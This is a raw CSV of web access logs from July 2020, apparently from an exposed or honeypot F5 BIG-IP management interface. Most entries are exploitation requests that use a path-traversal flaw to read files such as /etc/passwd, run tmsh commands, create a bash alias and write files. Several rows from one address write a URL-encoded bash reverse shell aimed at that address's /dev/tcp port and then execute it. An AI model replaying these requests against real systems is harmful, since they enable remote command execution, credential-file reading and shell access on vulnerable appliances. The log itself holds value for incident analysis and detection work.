Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 7, 2020 @ 22:59:25.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/resolv.conf,curl/7.70.0,200
"Jul 7, 2020 @ 22:59:21.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:59:19.000",139.162.116.230,GET,/,-,400
"Jul 7, 2020 @ 22:59:17.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/hosts,curl/7.70.0,500
"Jul 7, 2020 @ 22:59:02.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/uptime,curl/7.70.0,200
"Jul 7, 2020 @ 22:58:18.000",185.100.86.154,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:36.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/var/log/lastlog,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:30.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:30.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:27.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/var/log/wtmp,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:15.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/uptime,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:14.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:14.000",165.254.62.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,curl/7.67.0,200
"Jul 7, 2020 @ 22:57:13.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:13.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:11.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:11.000",165.254.62.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,curl/7.67.0,200
"Jul 7, 2020 @ 22:57:03.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:02.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.70.0,200
"Jul 7, 2020 @ 22:56:53.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/hosts,curl/7.70.0,500
"Jul 7, 2020 @ 22:56:53.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:45.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp,curl/7.70.0,200
"Jul 7, 2020 @ 22:56:42.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:32.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:22.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:11.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:00.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:55:45.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:55:43.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:55:41.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:52:10.000",160.176.223.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp,python-requests/2.10.0,200
"Jul 7, 2020 @ 22:49:08.000",165.254.62.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,curl/7.67.0,200
"Jul 7, 2020 @ 22:46:44.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:46:23.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:46:20.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:45:58.000",209.17.96.186,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 22:44:45.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:44:30.000",185.100.86.182,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:44:28.000",185.100.86.182,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:44:09.000",185.100.86.182,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:44:07.000",185.100.86.182,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:43:44.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:43:42.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:40:43.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/uptime,curl/7.70.0,200
"Jul 7, 2020 @ 22:40:14.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.70.0,200
"Jul 7, 2020 @ 22:40:03.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:39:52.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp,curl/7.70.0,200
"Jul 7, 2020 @ 22:39:38.000",185.100.86.128,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release,curl/7.70.0,200
"Jul 7, 2020 @ 22:39:29.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 22:31:18.000",193.118.53.194,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 22:27:03.000",209.17.96.2,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 22:20:14.000",209.17.96.50,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 22:16:54.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:16:38.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:16:33.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:16:30.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:09:22.000",128.14.134.134,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 21:41:14.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/8adbdd06-c09a-11ea-8e3a-0242acac000d,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:41:13.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/8adbdd06-c09a-11ea-8e3a-0242acac000d&content=bash%20-i%20%3E&%20/dev/tcp/185.183.96.116/18244%200%3E&1,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:41:06.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/830c0f56-c09a-11ea-bb52-0242acac000d,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:41:03.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/830c0f56-c09a-11ea-bb52-0242acac000d&content=bash%20-i%20%3E&%20/dev/tcp/185.183.96.116/18244%200%3E&1,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:40:54.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:40:41.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:40:05.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/652b2ecc-c09a-11ea-8a94-0242acac000d,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:40:02.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/652b2ecc-c09a-11ea-8a94-0242acac000d&content=bash%20-i%20%3E&%20/dev/tcp/185.183.96.116/18244%200%3E&1,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:39:51.000",185.183.96.116,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:39:06.000",139.162.116.230,GET,/,-,400
"Jul 7, 2020 @ 21:29:54.000",198.211.120.110,GET,/tmui/tmui/login/welcome.jsp,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:53.000",198.211.120.110,GET,/tmui/tmui/login/images/logo_f5.png,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:53.000",198.211.120.110,GET,/xui/common/css/modals.css,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:53.000",198.211.120.110,GET,/tmui/tmui/login/images/background_banner.png,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:53.000",198.211.120.110,GET,/xui/common/css/base.css,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:53.000",198.211.120.110,GET,/xui/common/blank.html,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:51.000",198.211.120.110,GET,/xui/common/scripts/utility.js?,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:51.000",198.211.120.110,GET,/xui/common/css/reset.css,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:51.000",198.211.120.110,GET,/xui/common/css/fonts.css,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:50.000",198.211.120.110,GET,/tmui/tmui/login/css/login.css?,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:49.000",198.211.120.110,GET,/tmui/tmui/system/settings/redirect.jsp,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",302
"Jul 7, 2020 @ 21:29:49.000",198.211.120.110,GET,/tmui/login.jsp,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:48.000",198.211.120.110,GET,/,"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1",200
"Jul 7, 2020 @ 21:29:46.000",209.17.97.74,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 21:26:39.000",185.39.11.105,GET,/,-,400
"Jul 7, 2020 @ 21:25:46.000",103.10.81.172,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 21:25:08.000",103.10.81.172,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 21:22:00.000",71.6.232.7,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",200
"Jul 7, 2020 @ 21:18:15.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:18:08.000",192.35.168.144,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 21:17:07.000",103.10.81.172,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 21:16:23.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:13:28.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:12:55.000",103.10.81.172,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 21:12:37.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:11:31.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:10:36.000",39.45.20.139,GET,/xui/common/images/favicon.ico,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:36.000",39.45.20.139,GET,/xui/common/css/modals.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:19.000",39.45.20.139,GET,/tmui/tmui/login/welcome.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/xui/common/css/reset.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/xui/common/css/base.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/xui/common/blank.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/xui/common/css/modals.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/xui/common/css/fonts.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:18.000",39.45.20.139,GET,/tmui/tmui/login/images/background_banner.png,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:17.000",39.45.20.139,GET,/tmui/tmui/login/images/logo_f5.png,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:16.000",39.45.20.139,GET,/xui/common/scripts/utility.js?,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:10:15.000",39.45.20.139,GET,/tmui/tmui/login/css/login.css?,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:09:49.000",193.118.53.194,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 21:09:24.000",39.45.20.139,GET,/tmui/login.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:09:23.000",39.45.20.139,GET,/tmui/tmui/system/settings/redirect.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",302
"Jul 7, 2020 @ 21:09:17.000",39.45.20.139,GET,/favicon.ico,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:09:17.000",39.45.20.139,GET,/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:08:39.000",39.45.20.139,GET,/tmui/tmui/system/settings/redirect.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",302
"Jul 7, 2020 @ 21:08:39.000",39.45.20.139,GET,/tmui/login.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:08:35.000",39.45.20.139,GET,/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",200
"Jul 7, 2020 @ 21:08:20.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 21:08:01.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 21:04:26.000",109.70.100.19,GET,/tmui/login.jsp,curl/7.65.3,200
"Jul 7, 2020 @ 21:02:50.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,503
"Jul 7, 2020 @ 20:58:21.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,503
"Jul 7, 2020 @ 20:56:50.000",103.10.81.172,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,503
"Jul 7, 2020 @ 20:54:41.000",92.118.160.45,GET,/,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,503
"Jul 7, 2020 @ 20:53:23.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,503
"Jul 7, 2020 @ 20:46:17.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 20:46:05.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 20:45:13.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.18.4,200
"Jul 7, 2020 @ 20:45:07.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/b446d27a-c092-11ea-8d32-2fdee219a855,python-requests/2.18.4,200
"Jul 7, 2020 @ 20:45:05.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/b446d27a-c092-11ea-8d32-2fdee219a855&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 20:44:51.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 20:44:31.000",35.188.179.242,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 20:42:05.000",185.39.11.105,GET,/,-,400
"Jul 7, 2020 @ 20:40:21.000",185.39.11.105,GET,/,-,400
"Jul 7, 2020 @ 20:31:51.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
"Jul 7, 2020 @ 20:31:50.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
"Jul 7, 2020 @ 20:31:43.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
"Jul 7, 2020 @ 20:31:24.000",92.118.161.57,GET,/,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,200
"Jul 7, 2020 @ 20:28:56.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
